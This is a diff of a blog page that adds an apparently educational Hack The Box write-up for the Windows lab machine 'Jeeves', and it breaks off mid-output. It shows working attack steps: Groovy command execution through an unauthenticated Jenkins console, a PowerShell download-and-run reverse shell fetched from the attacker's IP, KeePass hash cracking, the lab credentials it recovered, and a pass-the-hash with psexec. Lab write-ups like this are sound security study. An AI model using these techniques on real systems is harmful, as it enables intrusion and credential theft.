@@ -4,8 +4,8 @@
   <meta name="generator" content="Hexo 6.1.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/categories/"/>
+  
+  <link rel="canonical" href="http://example.com/2022/07/13/htb-jeeves/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://npm.elemecdn.com'>
@@ -31,18 +31,24 @@
   <!-- feed -->
   <!-- 页面元数据 -->
   <pjax>
-  <title>所有分类 - Study notes</title>
-  <meta name="keywords" content="null">
+  <title>HTB:Jeeves - Study notes</title>
+  <meta name="keywords" content="Hackthebox,windows,jenkins,potato,null">
   <meta desc name="description" content="Study notes - bzyfjb - Study notes">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="所有分类">
-<meta property="og:url" content="http://example.com/categories/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Jeeves">
+<meta property="og:url" content="http://example.com/2022/07/13/HTB-Jeeves/index.html">
 <meta property="og:site_name" content="Study notes">
+<meta property="og:description" content="informationnmap1234567891011121314151617181920212223242526272829303132333435363738394041424344nmap -sC -sV -Pn -A -v 10.10.10.63 -oN nmap.res -p 80,135,445,50000  PORT      STATE SERVICE      VERSION8">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-06-29T13:08:16.447Z">
-<meta property="article:modified_time" content="2022-06-23T15:13:59.000Z">
+<meta property="article:published_time" content="2022-07-13T05:24:46.000Z">
+<meta property="article:modified_time" content="2022-07-13T05:53:06.928Z">
 <meta property="article:author" content="bzyfjb">
+<meta property="article:tag" content="Hackthebox">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="jenkins">
+<meta property="article:tag" content="potato">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   </pjax>
@@ -2388,7 +2394,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper category dock' style="display: none;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"></div>
 
@@ -2462,46 +2468,307 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/13/HTB-Jeeves/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Study notes">
+  </span>
+  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
+    <meta itemprop="name" content="Study notes">
+    <meta itemprop="description" content="">
+  </span>
   
-    
-      <div class='post-wrapper'>
-        <article id="cat" class="post article white-box reveal shadow floatable blur">
-          <h2>所有分类</h2>
-          <div class="all-cats">
-            
-              
-                <a class="" href="/categories/Hackthebox/">
-                  <span><i class='fa-solid fa-folder-open fa-fw' aria-hidden="true"></i>&nbsp;&nbsp;Hackthebox</span>
-                  <span class="title">
-                    (1)
-                  </span>
-                </a>
-              
-                <a class="" href="/categories/daily/">
-                  <span><i class='fa-solid fa-folder-open fa-fw' aria-hidden="true"></i>&nbsp;&nbsp;daily</span>
-                  <span class="title">
-                    (1)
-                  </span>
-                </a>
-              
-                <a class="" href="/categories/java%E5%AE%89%E5%85%A8/">
-                  <span><i class='fa-solid fa-folder-open fa-fw' aria-hidden="true"></i>&nbsp;&nbsp;java安全</span>
-                  <span class="title">
-                    (1)
-                  </span>
-                </a>
-              
-            
-          </div>
-          <br>
-          
 
-        </article>
+
+  
+    <span hidden>
+      <meta itemprop="image" content="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+    </span>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title" itemprop="name headline">
+        HTB:Jeeves
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/Hackthebox/">Hackthebox</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/Hackthebox/" itemprop="url"><span itemprop="name">Hackthebox</span></a>
+      </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-07-13T13:24:46+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2022年7月13日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="HTB:Jeeves" data-path="/2022/07/13/HTB-Jeeves/">
+        <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fa-solid fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
     
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <div class="story post-story"><h2 id="information"><a href="#information" class="headerlink" title="information"></a>information</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -Pn -A -v 10.10.10.63 -oN nmap.res -p 80,135,445,50000  </span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Ask Jeeves</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">50000/tcp open  http         Jetty 9.4.z-SNAPSHOT</span><br><span class="line">|_http-title: Error 404 Not Found</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT) </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or </span><br><span class="line">8.0 (86%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1607 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 </span><br><span class="line">(85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 0.009 days (since Tue Jul 12 16:17:49 2022)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-07-12T13:29:59</span><br><span class="line">|_  start_date: 2022-07-12T13:18:01</span><br><span class="line">|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 135/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   136.17 ms bogon (10.10.14.1)</span><br><span class="line">2   136.31 ms localhost (10.10.10.63)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="WEB-80"><a href="#WEB-80" class="headerlink" title="WEB-80"></a>WEB-80</h3><p>首页及插件信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_fY50UgeOcF.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_fY50UgeOcF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>随便输入什么，跳转</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_7oN-8qMLuy.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_7oN-8qMLuy.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>查看源码，报错页面是一张图片</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_FdZQQgHM0A.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_FdZQQgHM0A.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>查看响应头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Last-Modified: Mon, 06 Nov 2017 02:34:40 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">ETag: &quot;2277f7cba756d31:0&quot;</span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">Date: Tue, 12 Jul 2022 13:43:39 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 503</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_Oda-Hzyz-V.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_Oda-Hzyz-V.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="WEB-50000"><a href="#WEB-50000" class="headerlink" title="WEB-50000"></a>WEB-50000</h3><p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_Xk-bqR8TGz.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_Xk-bqR8TGz.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>爆破目录，得到&#x2F;askjeeves</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_OBjpTSyk8c.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_OBjpTSyk8c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>未经认证可直接访问，发现jenkins未授权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_zCDW1cjeYW.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_zCDW1cjeYW.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>可成功命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_J8UIqtlIiD.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_J8UIqtlIiD.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>但是这里存在问题：</p>
+<p>需要将命令的执行方式设为<code>println &quot;cmd.exe /c dir&quot;.execute().text</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_a17Ctf8tIH.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_a17Ctf8tIH.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_xi9gt-hcC1.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_xi9gt-hcC1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</div><div class="story post-story"><h2 id="shell-as-kohsuke"><a href="#shell-as-kohsuke" class="headerlink" title="shell as kohsuke"></a>shell as kohsuke</h2><p>利用nishang反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.10.14.18:808/Invoke-PowerShellTcp.ps1&#x27;);&quot;.execute().text</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_hgRNTe6t8_.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_hgRNTe6t8_.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>当前权限对Administrator目录没有访问权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_9O8hI3amxe.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_9O8hI3amxe.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>回到家目录读取user.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image__t3xoEPy5C.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image__t3xoEPy5C.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</div><div class="story post-story"><h2 id="shell-as-Administrator"><a href="#shell-as-Administrator" class="headerlink" title="shell as Administrator"></a>shell as Administrator</h2><h3 id="方式1："><a href="#方式1：" class="headerlink" title="方式1："></a>方式1：</h3><p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_OOc_Ko3ULh.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_OOc_Ko3ULh.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>kdbx是KeePass文件，KeePass 是一款免费的开源密码管理器</p>
+<p>需要将该文件下载到本地</p>
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_nvA7BsanPC.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_nvA7BsanPC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>首先需要破解CEH.kdbx的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/new/HTB/jeeves]</span><br><span class="line">└─$ keepass2john CEH.kdbx        </span><br><span class="line">CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9</span><br><span class="line">142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/new/HTB/jeeves]</span><br><span class="line">└─$ keepass2john CEH.kdbx &gt; CEH.kdbx.hash </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hashcat CEH.kdbx.hash /usr/share/wordlists/rockyou.txt  --user </span><br><span class="line">...</span><br><span class="line">$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a</span><br><span class="line">6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到moonshine1</p>
+<p>得到密码后，就可以从文件中提取数据了</p>
+<p>有两种方式提取：1、命令行工具kpcli   2、安装图形化工具KeePass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 连接</span><br><span class="line">┌──(kali㉿kali)-[~/new/HTB/jeeves]</span><br><span class="line">└─$ kpcli --kdb CEH.kdbx </span><br><span class="line">Please provide the master password: *************************</span><br><span class="line"></span><br><span class="line">KeePass CLI (kpcli) v3.1 is ready for operation.</span><br><span class="line">Type &#x27;help&#x27; for a description of available commands.</span><br><span class="line">Type &#x27;help &lt;command&gt;&#x27; for details on individual commands.</span><br><span class="line"></span><br><span class="line">kpcli:/&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有</span><br><span class="line">kpcli:/&gt; find .</span><br><span class="line">Searching for &quot;.&quot; ...</span><br><span class="line"> - 8 matches found and placed into /_found/</span><br><span class="line">Would you like to list them now? [y/N] </span><br><span class="line">=== Entries ===</span><br><span class="line">0. Backup stuff                                                           </span><br><span class="line">1. Bank of America                                   www.bankofamerica.com</span><br><span class="line">2. DC Recovery PW                                                         </span><br><span class="line">3. EC-Council                               www.eccouncil.org/programs/cer</span><br><span class="line">4. It&#x27;s a secret                                 localhost:8180/secret.jsp</span><br><span class="line">5. Jenkins admin                                            localhost:8080</span><br><span class="line">6. Keys to the kingdom                                                    </span><br><span class="line">7. Walmart.com                                             www.walmart.com</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"># 打印信息</span><br><span class="line">kpcli:/&gt; show -f 0</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: Backup stuff</span><br><span class="line">Uname: ?</span><br><span class="line"> Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><br><span class="line">  URL: </span><br><span class="line">Notes: </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 1</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: Bank of America</span><br><span class="line">Uname: Michael321</span><br><span class="line"> Pass: 12345</span><br><span class="line">  URL: https://www.bankofamerica.com</span><br><span class="line">Notes: </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 2</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: DC Recovery PW</span><br><span class="line">Uname: administrator</span><br><span class="line"> Pass: S1TjAtJHKsugh9oC4VZl</span><br><span class="line">  URL: </span><br><span class="line">Notes: </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 3</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: EC-Council</span><br><span class="line">Uname: hackerman123</span><br><span class="line"> Pass: pwndyouall!</span><br><span class="line">  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh</span><br><span class="line">Notes: Personal login</span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 4</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: It&#x27;s a secret</span><br><span class="line">Uname: admin</span><br><span class="line"> Pass: F7WhTrSFDKB6sxHU1cUn</span><br><span class="line">  URL: http://localhost:8180/secret.jsp</span><br><span class="line">Notes: </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 5</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: Jenkins admin</span><br><span class="line">Uname: admin</span><br><span class="line"> Pass: </span><br><span class="line">  URL: http://localhost:8080</span><br><span class="line">Notes: We don&#x27;t even need creds! Unhackable! </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 6</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: Keys to the kingdom</span><br><span class="line">Uname: bob</span><br><span class="line"> Pass: lCEUnYPjNfIuPZSzOySA</span><br><span class="line">  URL: </span><br><span class="line">Notes: </span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f 7</span><br><span class="line"></span><br><span class="line"> Path: /CEH/</span><br><span class="line">Title: Walmart.com</span><br><span class="line">Uname: anonymous</span><br><span class="line"> Pass: Password</span><br><span class="line">  URL: http://www.walmart.com</span><br><span class="line">Notes: Getting my shopping on</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The first entry in the KeePass, “Backup”, provided what looks like a Windows hash:</p>
+<p>Windows will show hashes in the format <code>LM Hash:NT Hash</code>. LM is the much less secure hash format used in legacy Windows systems. It’s typically not used, but kept around for backwards compatibility. Many times, the LM hash for the blank password is stored, which is ignored by Windows but allows the field not to be empty. <code>aad3b435b51404eeaad3b435b51404ee</code> is the LM hash of the empty password.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/new/HTB/jeeves]</span><br><span class="line">└─$ crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><br><span class="line">SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/new/tools/impacket/examples]</span><br><span class="line">└─$ python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 10.10.10.63.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file ZswaRuHy.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.63.....</span><br><span class="line">[*] Creating service TzJK on 10.10.10.63.....</span><br><span class="line">[*] Starting service TzJK.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.10586]</span><br><span class="line">(c) 2015 Microsoft Corporation. All rights reserved.</span><br><span 